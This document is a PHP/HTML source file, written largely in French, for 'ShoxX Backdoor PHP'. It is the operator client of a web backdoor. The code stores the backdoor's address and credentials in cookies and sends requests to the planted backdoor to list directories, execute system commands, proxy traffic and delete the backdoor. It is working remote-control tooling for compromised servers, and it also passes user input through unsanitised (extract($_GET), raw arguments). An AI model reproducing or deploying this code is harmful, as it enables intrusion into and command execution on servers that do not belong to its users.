<?php
	// Connection 
	
	function CreateCookie($adress,$user,$password)
	{
		
		// if((substr($adress,0,7)!="http://")||(substr($adress,0,7)!="HTTP://"))
		// {
		// $adress=("http://".$adress);
		// }
	
		$password=md5($password);
		setcookie('Backdoor_Adress',$adress,time()+365*24*3600);
		setcookie('Username',$user,time()+365*24*3600);
		setcookie('Password',$password,time()+365*24*3600);
		
	
	}
	if (isset($_POST['remote_adress']) && $_POST['remote_adress']!='' && isset($_POST['remote_username']) && $_POST['remote_username']!='' && isset($_POST['remote_password']) && $_POST['remote_password']!='')
	{
		CreateCookie($_POST['remote_adress'],$_POST['remote_username'],$_POST['remote_password']);
	}

	if(isset($_COOKIE['Backdoor_Adress']) && $_COOKIE['Backdoor_Adress']!='' && isset($_COOKIE['Username']) && $_COOKIE['Username']!='' && isset($_COOKIE['Password']) && $_COOKIE['Password']!='')
	{
		$connect=true;
	}
	else{
		$connect=false;
	}
	function Disconnect(){
		setcookie('Backdoor_Adress','false',0);
		setcookie('Username','false',0);
		setcookie('Password','false',0);
	}
	if (isset($_GET['User_Disconnect']) && $_GET['User_Disconnect']=='yes')
	{
		Disconnect();
		$connect=false;
	}	
	
	//////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////// Backdoor////////////////////////////////////////////// 
	//////////////////////////////////////////////////////////////////////////////////////////////////////
	function request($url,$get=array(),$post=array())
	{
		if(is_array($get))
			$type=http_build_query($get);
		else
			$type=$get;
		if(is_array($post))
			$contenu=http_build_query($post);
		else
			$contenu=$post;
		($contenu!='') ? $type=$type."\r\n".'CTR: '.$contenu : '' ;
		$options = array(
		'http' => array(
			'user_agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0',
			'method' => 'GET',
			'header' => 'CTR: '.$type));

			$contexte = stream_context_create( $options );
			$page='';
			$fh = fopen( $url, 'r', false, $contexte );
			// $page = substr(stream_get_contents($fh),2);
			$page = stream_get_contents($fh);
			fclose($fh);
			
			return $page;
	}
	// Choix des envois 
	if(isset($_GET['Action']) && $_GET['Action']!='' && $connect==true)
	{
		extract($_GET);
		if($Action=="Dossier")
		{
			if(isset($arg) && $arg!='')
			{
			$page=request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Dossier&arg='.$arg,'');
			}
		
			else{
			$page = request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Dossier','');
			}
		}
		if($Action=="Commandes")
		{
			if(isset($arg) && $arg!='')
			{
			$page = request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Commandes&arg='.$arg,'');
			}
		}
		// if($Action=="Upload")
		// {
			// $page = request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Upload','');
		// }
		if($Action=="Proxy")
		{
		$page = request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Proxy&arg='.$arg,'');
		}
		if($Action=="Delete_Backdoor")
		{
		$page=request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&action=Delete_Backdoor');
		}
	}
	if(isset($_GET['Try_Connect']) && $_GET['Try_Connect']=="yes")
	{
		
		$page = request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&try=connect','');
	
	}

?>


<html>
	<head>
		<style>
		
			::-moz-selection { /* Pour firefox */
				background:red;
				color:white;
			}
			::selection { /* Pour les autres */
				background: red;
				color:white;
			}
			#left{
				border:1px black solid;
				width:18%;
				height:100%;
				float:left;
			}
			#centre{
				border:1px black solid;
				width:60%;
				height:100%;
				float:left;
				margin-left:1%;
				overflow:scroll;
			}
			#right{
				border:1px black solid;
				width:18%;
				height:100%;					
				float:left;
				margin-left:1%;
			}
			
			#left_log_logged{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:20%;
				text-align:center;
			}
			#left_log_notlogged{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:20%;
				text-align:center;
			}
			#left_text{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:58%;
			}
			#left_info{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:20%;
			}
			#right_action{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:40%;
			
			}
			#right_help{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:30%;
			
			}
			#right_info{
				border:1px black solid;
				width:97%;
				margin-left:1%;
				margin-top:1%;
				height:28%;
			
			}
			.bouton_action{
				width:80%;
				height:8%;
				background-color:#2780bc;
				text-align:center;
				margin:auto;
				margin-top:2%;
				transition-property: background-color;	/*Works on Chrome*/
				transition-duration: 0.5s;
				text-decoration:none;
			}
			.bouton_action:hover{
				background-color:orange;
			}
			.left_input{
				width:97%;
				
				margin-top:1%;
			}
			#log_lock{
				float:right;
				width:30%;
				height:10%;
				margin-right:8%;
				margin-top:3%;
			}
			#Button_Disconnect{
				width:48%;
				float:right;
				background-color:#2780bc;
				transition-property: background-color;	/*Works on Chrome*/
				transition-duration: 0.5s;
			}
			#Button_Disconnect:hover{
				background-color:orange;
			}
			#Button_Try{
				width:48%;
				float:left;
				background-color:#2780bc;
				transition-property: background-color;	/*Works on Chrome*/
				transition-duration: 0.5s;
			
			}
			#Button_Try:hover{
				background-color:orange;
			
			}
			#unconnected{
				border:1px black solid;
				text-align:center;
				margin:auto;
				width:98%;
				margin-top:1%;
			}
			.link_no_under{
				text-decoration:none;
				color:black;
			}
			.inactive{
				Display:none;
			}
			pre>a{
				text-decoration:none;
			
			}
			#proxy_load,#System_Cmd,#delete_backdoor{
				border:1px black solid;
				margin:1%;
				text-align:center;
			
			}
		</style>
		<script>
		function System_CMD()
		{
			var b = document.getElementById("right_help_dir");
			b.className='inactive';
			var a = document.getElementById("System_Cmd");
			a.className='active';
			var c = document.getElementById("right_help_sys");
			c.className='active';
			var d = document.getElementById("proxy_load");
			d.className="inactive";
			var e = document.getElementById("delete_backdoor");
			e.className='inactive';
		}
			
		function Commandes()
		{
			cmd=document.getElementById('input_cmd').value;
			if(cmd!="")
			{
				document.location.href=(document.location.origin+document.location.pathname+"?Action=Commandes&arg="+cmd);
			}
		
		}
		
		function Proxy()
		{
			proxy=document.getElementById('Proxy_cible').value;
			if(proxy!="")
			{
				document.location.href=(document.location.origin+document.location.pathname+"?Action=Proxy&arg="+proxy);
			
			}
		
		}
		
		function Delete_Backdoor_Func()
		{
			val=document.getElementById('Password_Delete_Backdoor').value;
			if(val=="yes")
			{
				document.location.href=(document.location.origin+document.location.pathname+"?Action=Delete_Backdoor");
			}
		
		}
		
		function Proxy_menu()
		{
		
			var b = document.getElementById("right_help_dir");
			b.className='inactive';
			var a = document.getElementById("System_Cmd");
			a.className='inactive';
			var c = document.getElementById("right_help_sys");
			c.className='inactive';
			var d = document.getElementById("proxy_load");
			d.className='active';
			var e = document.getElementById("delete_backdoor");
			e.className='inactive';
		
		}
		function Delete_Backdoor()
		{
		
			var b = document.getElementById("right_help_dir");
			b.className='inactive';
			var a = document.getElementById("System_Cmd");
			a.className='inactive';
			var c = document.getElementById("right_help_sys");
			c.className='inactive';
			var d = document.getElementById("proxy_load");
			d.className='inactive';
			var e = document.getElementById("delete_backdoor");
			e.className='active';
		}
		</script>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	</head>
	
	<body>
<section id="left">

<?php 
if ($connect==true)
{
echo '
		<div id="left_log_logged">
		<center>
		<p>	Bienvenue :  '.$_COOKIE['Username'].'</p>
		<p> Vous etes connecte a : '.$_COOKIE['Backdoor_Adress'].'</p>
		
		<br>
		<a class="link_no_under" href="user.php?Try_Connect=yes"><div id="Button_Try">Verifier Connection</div></a>
		<a class="link_no_under" href="user.php?User_Disconnect=yes"><div id="Button_Disconnect">Deconnection</div></a>
		
		
		</div>';
}
elseif($connect==false){
	echo"
	<div id='left_log_notlogged'>
		<form method='post' action=user.php>
			Backdoor's Adress
				<input type='text' name='remote_adress' id='Backdoor_adress' class='left_input'/>
			UserName 
				<input type='text' name='remote_username' id='backdoor_username' class='left_input'/>
			Password
				<input type='password' name='remote_password' id='backdoor_password' class='left_input'/>
			
				<input type='submit' value='Log' onclick='LogId()' id='log_lock'/>
		</form>
	</div>";

}?>
<?php if($connect==true)
	{	
		echo"<div id='left_text'>
			<center>
				<p> Last News </p>
			</center>
			</div>";
	}
	elseif($connect==false)
	{
		echo"<div id='left_text'>
		Bienvenue sur MyLitteBackdoorPhp !
		</div>";
	}
?>
	<div id="left_info">
	<p>ShoxX Backdoor Php</p>
	<p>Client Version : 0.1 Alpha</p>
	<p>Backdoor Version : 0.1 Alpha</p>
	</div>

</section>

<section id="centre">
	<?php if (isset($page) && $connect==true)
			{
				echo $page;
				if($page=='')
				{
					if(isset($_GET['Action']) && $_GET['Action']=="Commandes")
					{
						echo "<center> Le resultat de la commande n'est pas visible.
						si vous tentiez d'agir sur les dossiers tentez de regarder dans la categorie Lister Dossier => </center>";
					
					}
				
				}
				if(isset($ext) && $ext!=$page)
				{
					echo $ext;
				}
			
			}
		  if($connect==true)
		  {
		  echo "<div id='System_Cmd' class='inactive'>
					<h1> Commandes System </h1>
						<p>Commande : <input type='text' id='input_cmd' name='commande'/>
						<input type='submit' value='Executer' onclick='Commandes()'/>
						</p>
					
					
				</div>
				<div id='proxy_load' class='inactive'>
					<h1> Proxy </h1>
					<p> Entrez simplement ici l'adresse cible </p>
					<input type='text' name='Proxy_cible' id='Proxy_cible'/>
					<input type='submit' value='Acceder' onclick='Proxy()'/>
				</div>
				
				<div id='delete_backdoor' class='inactive'>
					<h1> Supprimer la Backdoor </h1>
					<p> Pour supprimer la Backdoor entrez 'yes' dans l'input </p>
					<input type='text' name='Password_Delete_Backdoor' id='Password_Delete_Backdoor'/>
					<input type='submit' value='Supprimer' onclick='Delete_Backdoor_Func()'/>
				</div>
				";
		  
		  
		  }
		if($connect==false)
		{
		 echo "<div id='unconnected'>
				<p>Welcome to ShoxX Backdoor PHP</p>
				<p>Veuillez vous logger dans la case en haut a gauche.</p>
				<p>Fournissez bien l'adresse de la backdoor que vous voulez contacter</p>
				<p>Ainsi que les logs que vous lui avez donné</p>
				</div>
				<hr>
				<center><pre> ____  _               __  __  ____             _       _                    ____  _           
 / ___|| |__   _____  __\ \/ / | __ )  __ _  ___| | ____| | ___   ___  _ __  |  _ \| |__  _ __  
 \___ \| '_ \ / _ \ \/ / \  /  |  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__| | |_) | '_ \| '_ \ 
  ___) | | | | (_) >  <  /  \  | |_) | (_| | (__|   < (_| | (_) | (_) | |    |  __/| | | | |_) |
 |____/|_| |_|\___/_/\_\/_/\_\ |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|    |_|   |_| |_| .__/ 
                                                                                         |_|    </pre></center>
				<hr>
				
				<div id='unconnected'><p>Welcome to ShoxX Backdoor PHP</p>
				<p>Please log in at the top left.</p>
				<p>Well provide the address of the backdoor you want to contact</p>
				<p>And logs you gave him</p>
				</div>
				<hr>
				<center>
		<pre>                                                                     
        TAKE US TO YOUR LEADER               WE COME IN PEACE        
                                                                     
                  \                                 /                
                   \    .-''''-.       .-''''-.    /                 
                    \  /        \     /        \  /                  
                      /_        _\   /_        _\                    
                     // \      / \\ // \      / \\                   
                     |\__\    /__/| |\__\    /__/|                   
                      \    ||    /   \    ||    /                    
                       \        /     \        /                     
                        \  __  /       \  __  /                      
                .-''''-. '.__.'.-''''-. '.__.'.-''''-.               
               /        \ |  |/        \ |  |/        \              
              /_        _\|  /_        _\|  /_        _\             
          // \      / \\ // \      / \\ // \      / \\            
             |\__\    /__/| |\__\    /__/| |\__\    /__/|            
              \    ||    /   \    ||    /   \    ||    /             
               \        /     \        /     \        /              
            /   \  __  /       \  __  /       \  __  /  \            
           /     '.__.'         '.__.'         '.__.'    \           
          /       |  |           |  |           |  |      \          
         /        |  |           |  |           |  |       \         
                                                                     
  I THINK I STOPPED               |                 WHAT WE NEED HERE
UP YOUR HUMAN TOILETS             |                  IS A SALAD BAR  
                                  |                                  
                                                                     
                            HOLY GOD I'M                             
                           GOING TO BURST                           
				
				
				
				
</pre></center>";
		
		
		}
	?>
</section>

<section id="right">
	<div id="right_action">
<?php if($connect==true)
{echo '
		<a class="link_no_under" href="user.php?Action=Dossier">
			<div class="bouton_action"> 
				Lister Dossier
			</div>
		</a>

		<div class="bouton_action" onclick="System_CMD()">
			Executer Commandes 
		</div>
		
		<div class="bouton_action" onclick="UpFichier()">
			Envoyer Fichiers
		</div>

		<div class="bouton_action" onclick="Proxy_menu()" >
			Proxy
		</div>
		
		
		
		
		<div class="bouton_action" onclick="Delete_Backdoor()">
			Supprimer la Backdoor
		</div>
		';
}
elseif($connect==false)
{
	echo "<p> <= Please Log on ! </p>";

}?>
	
	</div>
	<div id='right_help'>
	<?php if(isset($_GET['Action']) && $_GET['Action']=="Dossier")
	{
		echo"<div id='right_help_dir' class='active'>";
	}
		else{
		echo "<div id='right_help_dir' class='inactive'>";
	}
	?>
		Vous pouvez ici lister les fichiers. Legende : 
			<ul>
				<li>Gris => Aucun droit</li>
				<li>Jaune => Executer</li>
				<li>Rouge => Ecrire</li>
				<li>Orange => Executer et Ecrire</li>
				<li>Bleu => Lire</li>
				<li>Vert => Executer et Lire</li>
				<li>Violet => Ecrire et Lire</li>
				<li>Noir => Executer Ecrire et Lire</li>
			</ul>
			</div>
			
	<div id='right_help_sys' class='inactive'>
		<p>Entrez votre commande dans l'input</p>
		<p>Si possible un resultat vous sera affiché</p>
	
	
	</div>
	
	
	
	
	</div>
	<div id="right_info">
	<?php if($connect==true)
			{
				$info=request($_COOKIE['Backdoor_Adress'],'user='.$_COOKIE['Username'].'&pass='.$_COOKIE['Password'].'&info=yes');
				echo $info;
			}?>
	</div>

</section>
</body>
</html>